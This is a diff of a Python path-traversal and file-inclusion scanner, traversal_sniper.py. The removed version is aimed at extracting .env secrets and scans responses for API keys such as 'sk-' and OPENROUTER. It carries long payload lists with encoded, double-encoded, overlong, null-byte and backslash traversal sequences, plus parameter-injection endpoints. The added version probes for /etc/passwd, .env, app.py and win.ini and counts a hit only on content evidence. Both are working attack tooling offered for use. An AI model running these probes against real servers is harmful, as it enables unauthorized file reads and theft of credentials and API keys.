@@ -1,258 +1,73 @@
-"""
-traversal_sniper.py — Path Traversal / LFI probe for .env and config files.
-
-Crafts traversal payloads across common static roots and file-serving endpoint
-patterns. When a target leaks its absolute app root in a stack trace, feed it in
-with --app-root to add precise absolute-path payloads for that specific depth.
-"""
-import sys, os, argparse, urllib.request, urllib.error, urllib.parse, json, re
+#!/usr/bin/env python3
+"""Path Traversal / LFI probe — requires real file content evidence, not just 200."""
+import argparse
+import os
+import sys
+import re
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from vibe_core import VibeTool
+from vibe_core import VibeTool, DEFAULT_TARGET_BASE
 
-# Static files are often served from web/public or web/dist, so traversal depth
-# varies. We try all realistic depths.
-
-TARGETS = [".env", ".env.local", ".env.production", ".env.development",
-           "package.json", "server.js", "index.js", "app.js", ".env.example"]
-
-TRAVERSALS = [
-    # Standard double-dot sequences
-    "../", "../../", "../../../", "../../../../", "../../../../../",
-    # URL encoded single
-    "%2e%2e%2f", "%2e%2e/", "..%2f",
-    # Double-encoded
-    "%252e%252e%252f", "%252e%252e/",
-    # Backslash (Windows)
-    "..\\", "..%5c", "%2e%2e%5c",
-    # Mixed slash
-    "..%2F", "..%5C",
-    # Overlong encoding
-    "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
-    # Unicode variants
-    "%e2%80%ae", "‥/",
-    # Null byte bypass
-    "%00../",
-    # Multiple path confusion
-    "static/../", "assets/../", "public/../",
-    "dist/../", "build/../", "src/../",
-    "static/../../", "assets/../../",
+PAYLOADS = [
+    "../etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "../app.py",
+    "../.env",
+    "..\\..\\..\\windows\\win.ini",
+    "/etc/passwd",
 ]
-
-# Static asset paths the server likely serves from
-STATIC_ROOTS = [
-    "/",
-    "/static/",
-    "/assets/",
-    "/public/",
-    "/files/",
-    "/img/",
-    "/js/",
-    "/css/",
-    "/api/static/",
-]
-
-# Specific traversal paths combining known app structure
-PRECISE_TRAVERSALS = [
-    # If serving from web/public: ../  goes to web/, ../../ to CLI/
-    "/../.env",
-    "/../../.env",
-    "/../../../.env",
-    "/../server.js",
-    "/../index.js",
-    "/../package.json",
-    "/../.env.local",
-    # Encoded variants of above
-    "/%2e%2e/.env",
-    "/%2e%2e/%2e%2e/.env",
-    "/%2e%2e/server.js",
-    "/%2e%2e%2f.env",
-    "/%2e%2e%2f%2e%2e%2f.env",
-    # Static file bypass via known paths
-    "/static/../.env",
-    "/assets/../.env",
-    "/js/../.env",
-    "/css/../.env",
-]
-
-# Windows canaries + deep relative climbs. Standard well-known files confirm a
-# traversal without needing the target's absolute path; --app-root adds precise
-# absolute payloads when a stack trace has leaked the real root.
-WINDOWS_PATHS = [
-    "/../../../../../../windows/win.ini",
-    "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
-    "/../../../../../../windows/system32/drivers/etc/hosts",
-    "/..%2F..%2F..%2F..%2F..%2F.env",
-    "/..\\..\\..\\.env",
-    "/..%5C..%5C..%5C.env",
-]
-
-
-def _absolute_root_payloads(app_root):
-    """Build precise absolute-path payloads from an operator-supplied app root
-    (e.g. one leaked in a stack trace). Empty unless --app-root is given."""
-    root = (app_root or "").strip().rstrip("/\\")
-    if not root:
-        return []
-    sep = "\\" if (":" in root[:3] or "\\" in root) else "/"
-    payloads = []
-    for target in (".env", ".env.local", "server.js", "package.json"):
-        raw = f"/{root}{sep}{target}"
-        payloads.append(raw)
-        payloads.append("/" + urllib.parse.quote(f"{root}{sep}{target}", safe=""))
-    return payloads
-
-# Parameter injection for static file endpoints
-PARAM_TRAVERSALS = [
-    "/api/health?file=../.env",
-    "/api/health?path=../.env",
-    "/api/config?file=../.env",
-    "/api/config?include=../.env",
-    "/api/config?load=../.env",
-    # open redirect / LFI combos
-    "/api/chat?template=../../.env",
-    "/api/chat?persona=../../.env",
-]
-
 
 class TraversalSniper(VibeTool):
     def __init__(self):
-        super().__init__("Traversal Sniper", "Targeted Path Traversal for .env Key Extraction")
-        self.hits = []
+        super().__init__("traversal_sniper", "Path traversal / LFI probe")
 
-    def _try_path(self, base, path, label=""):
-        url = base + path
-        try:
-            r = urllib.request.urlopen(url, timeout=5)
-            body = r.read().decode(errors="replace")
-            ct = r.headers.get("Content-Type", "")
-            # Check for .env or JS content
-            is_interesting = (
-                "OPENROUTER" in body or
-                "API_KEY" in body or
-                "sk-or" in body or
-                "sk-" in body or
-                re.search(r"[A-Z_]+=.{10,}", body) or   # env var format
-                (r.status == 200 and "html" not in ct.lower() and len(body) > 20)
-            )
-            if is_interesting:
-                self.log(f"[HIT] {path} ({len(body)}b, {ct}): {body[:300]}", "hack")
-                self.hits.append((path, body[:500]))
-            elif r.status == 200:
-                self.log(f"[200 but meh] {path}: {body[:80]}")
-            return r.status, body
-        except urllib.error.HTTPError as e:
-            if e.code not in (404, 405):
-                self.log(f"[{e.code}] {path}")
-            return e.code, ""
-        except Exception:
-            return 0, ""
-
-    def vector_precise(self, base):
-        self.log("=== PRECISE: Known Path Traversal ===")
-        for path in PRECISE_TRAVERSALS:
-            self._try_path(base, path, "precise")
-
-    def vector_static_roots(self, base):
-        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
-        for root in STATIC_ROOTS:
-            for target in TARGETS[:4]:  # focus on .env variants
-                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
-                    path = root + traversal + target
-                    self._try_path(base, path)
-
-    def vector_windows(self, base):
-        self.log("=== WINDOWS: Windows Absolute Path Injection ===")
-        for path in WINDOWS_PATHS:
-            self._try_path(base, path)
-
-    def vector_params(self, base):
-        self.log("=== PARAMS: Parameter-Based LFI ===")
-        for path in PARAM_TRAVERSALS:
-            self._try_path(base, path)
-
-    def vector_known_files(self, base):
-        """Fetch known files that might be served accidentally."""
-        self.log("=== KNOWN FILES: Direct Access to Common Files ===")
-        paths = [
-            "/package.json",
-            "/package-lock.json",
-            "/.env",
-            "/.env.example",
-            "/server.js",
-            "/index.js",
-            "/app.js",
-            "/config.js",
-            "/webpack.config.js",
-            "/vite.config.js",
-            "/next.config.js",
-            "/vercel.json",
-            "/render.yaml",
-            "/.github/workflows/deploy.yml",
-            "/Dockerfile",
-            "/docker-compose.yml",
-        ]
-        for p in paths:
-            s, body = self._try_path(base, p)
-            if s == 200 and body:
-                self.log(f"  [ACCESSIBLE] {p}: {body[:200]}", "warn")
-
-    def vector_api_file_serve(self, base):
-        """Some APIs have file-serving endpoints; probe likely patterns."""
-        self.log("=== API FILE SERVE: Endpoint-Based File Access ===")
-        payloads = [
-            "/api/file?name=.env",
-            "/api/file?path=.env",
-            "/api/file?f=.env",
-            "/api/file?filename=.env",
-            "/api/serve?file=.env",
-            "/api/resource?path=.env",
-            "/api/download?file=.env",
-            "/api/export?file=.env",
-            "/api/read?file=.env",
-            "/api/open?file=.env",
-            # encoded
-            "/api/file?name=%2e%2e%2f.env",
-            "/api/file?path=..%2F.env",
-            "/api/file?name=..%5C.env",
-        ]
-        for p in payloads:
-            s, body = self._try_path(base, p)
-            if s not in (404, 405, 0):
-                self.log(f"  [{s}] {p}: {body[:150]}", "warn" if s == 200 else "info")
-
-    def run(self, url, app_root=""):
+    def run(self, base_url, app_root=None):
         self.banner()
-        base = url.rstrip("/")
+        base = base_url.rstrip("/")
+        baseline = self.baseline_probe(base)
+        endpoints = [
+            f"{base}/files",
+            f"{base}/file",
+            f"{base}/download",
+            f"{base}/static",
+            f"{base}/api/files",
+            f"{base}/?path=",
+            f"{base}/?file=",
+        ]
+        if app_root:
+            # precise absolute payloads when stack traces leak the root
+            depth = app_root.count("/") + 2
+            PAYLOADS.extend([("../" * depth) + "app.py", app_root + "/app.py"])
 
-        self.vector_precise(base)
-        self.vector_known_files(base)
-        self.vector_api_file_serve(base)
-        self.vector_static_roots(base)
-        self.vector_windows(base)
-        self.vector_params(base)
-
-        absolute = _absolute_root_payloads(app_root)
-        if absolute:
-            self.log("=== ABSOLUTE: Operator-supplied app-root payloads ===")
-            for path in absolute:
-                self._try_path(base, path)
-
-        self.log("================================")
-        if self.hits:
-            self.log(f"TRAVERSAL CONFIRMED — {len(self.hits)} file(s) read!", "hack")
-            for path, content in self.hits:
-                self.log(f"  {path}:", "hack")
-                self.log(f"  {content}", "hack")
-        else:
-            self.log("No traversal confirmed. Static files properly jailed.", "warn")
-
+        hits = []
+        for ep in endpoints:
+            for payload in PAYLOADS:
+                if "?" in ep:
+                    url = ep + payload
+                else:
+                    url = ep + "?path=" + payload
+                status, body, _ = self.safe_request(url)
+                body = body or ""
+                if status != 200 or self.matches_baseline(body, baseline):
+                    continue
+                # Real evidence: passwd markers, env keys, or Python source
+                evidence = any([
+                    re.search(r"root:.*:0:0:", body),
+                    "DATABASE_URL" in body or "SECRET_KEY" in body,
+                    "def " in body and "import " in body,
+                    "[extensions]" in body.lower(),  # win.ini
+                ])
+                if evidence:
+                    hits.append({"url": url, "payload": payload})
+                    self.log(f"TRAVERSAL CONFIRMED: {payload}", "hack")
+        if not hits:
+            self.log("No confirmed traversal (content evidence required)", "info")
+        return hits
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--url", required=True)
-    parser.add_argument("--app-root", default="",
-                        help="Absolute app root leaked in a stack trace, to build precise payloads")
-    parser.add_argument("-v", "--version", action="version", version="Traversal Sniper 1.0.0")
-    args = parser.parse_args()
-    TraversalSniper().run(args.url, app_root=args.app_root)
+    p = argparse.ArgumentParser()
+    p.add_argument("--url", default=DEFAULT_TARGET_BASE)
+    p.add_argument("--app-root", default=None)
+    args = p.parse_args()
+    TraversalSniper().run(args.url, args.app_root)
